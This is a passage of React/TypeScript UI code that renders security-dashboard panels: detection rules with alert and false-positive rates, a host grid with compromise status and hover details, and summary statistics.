    const items = data.items as Array<{ name: string; alerts: number; fpRate: number; note?: string }>;
    return (
      <div css={containerCss}>
        <div css={css`font-size: 11px; font-weight: 500; letter-spacing: 0.06em; text-transform: uppercase; color: rgba(255, 255, 255, 0.3); margin-bottom: 10px;`}>
          {data.title as string}
        </div>
        <div css={css`display: flex; flex-direction: column; gap: 6px;`}>
          {items.map((item, i) => (
            <div key={i} css={css`
              display: flex; align-items: center; gap: 12px; padding: 6px 4px;
              border-bottom: 1px solid rgba(255, 255, 255, 0.02); border-radius: 4px;
              cursor: default; transition: background 0.12s ease;
              &:hover { background: rgba(255, 255, 255, 0.025); }
              &:last-child { border-bottom: none; }
            `}>
              <span css={css`font-size: 13px; color: rgba(255, 255, 255, 0.55); flex: 1;`}>{item.name}</span>
              {item.alerts > 0 && <span css={css`font-size: 11px; color: rgba(255, 255, 255, 0.25);`}>{item.alerts} alerts/day</span>}
              {item.fpRate > 0 && <span css={css`font-size: 11px; color: rgba(255, 149, 125, 0.6);`}>{item.fpRate}% FP</span>}
              {item.note && <span css={css`font-size: 11px; color: ${watchColor}88;`}>{item.note}</span>}
            </div>
          ))}
        </div>
      </div>
    );
  }

  if (type === 'hosts') {
    const items = data.items as Array<{ name: string; status: string; action: string }>;
    const statusColors: Record<string, string> = { compromised: '#F04E98', source: '#FEC514', attempted: 'rgba(255, 255, 255, 0.3)' };
    return (
      <div css={containerCss}>
        <div css={css`font-size: 11px; font-weight: 500; letter-spacing: 0.06em; text-transform: uppercase; color: rgba(255, 255, 255, 0.3); margin-bottom: 10px;`}>
          {data.title as string}
        </div>
        <div css={css`display: grid; grid-template-columns: 1fr 1fr; gap: 4px 16px;`}>
          {items.map((item, i) => (
            <div
              key={i}
              onMouseEnter={() => setHoveredHost(item.name)}
              onMouseLeave={() => setHoveredHost(null)}
              css={css`
                display: flex; align-items: center; gap: 8px; padding: 6px 8px;
                border-radius: 6px; cursor: pointer;
                background: ${hoveredHost === item.name ? 'rgba(255, 255, 255, 0.04)' : 'transparent'};
                transition: all 0.12s ease;
                &:hover { background: rgba(255, 255, 255, 0.04); }
              `}
            >
              <span css={css`width: 6px; height: 6px; border-radius: 50%; background: ${statusColors[item.status] || 'rgba(255, 255, 255, 0.2)'}; flex-shrink: 0;`} />
              <span css={css`font-size: 12px; color: ${hoveredHost === item.name ? '#fff' : 'rgba(255, 255, 255, 0.55)'}; font-family: 'JetBrains Mono', monospace; transition: color 0.12s ease;`}>{item.name}</span>
              <span css={css`font-size: 10px; color: ${hoveredHost === item.name ? 'rgba(255, 255, 255, 0.5)' : 'rgba(255, 255, 255, 0.25)'}; margin-left: auto; transition: color 0.12s ease;`}>{item.action}</span>
            </div>
          ))}
        </div>
        {hoveredHost && (
          <div css={css`
            margin-top: 10px; padding: 10px 14px; border-radius: 8px;
            background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.06);
            animation: ${fadeIn} 0.15s ease both;
          `}>
            <div css={css`font-size: 12px; color: rgba(255, 255, 255, 0.5);`}>
              <span css={css`font-weight: 600; color: #fff;`}>{hoveredHost}</span>
              {' — Click to view full host details, process tree, and network connections'}
            </div>
          </div>
        )}
      </div>
    );
  }

  if (type === 'stats') {
    const items = data.items as Array<{ label: string; value: string }>;
    return (
      <div css={containerCss}>
        <div css={css`font-size: 11px; font-weight: 500; letter-spacing: 0.06em; text-transform: uppercase; color: rgba(255, 255, 255, 0.3); margin-bottom: 10px;`}>
          {data.title as string}
        </div>
        <div css={css`display: flex; gap: 24px;`}>
          {items.map((item, i) => (
            <div key={i} css={css`cursor: default; transition: transform 0.12s ease; &:hover { transform: translateY(-1px); }`}>
              <div css={css`font-size: 18px; font-weight: 700; color: #fff;`}>{item.value}</div>
              <div css={css`font-size: 11px; color: rgba(255, 255, 255, 0.3);`}>{item.label}</div>
            </div>
          ))}
        </div>
      </div>
    );
  }

  return null;
};
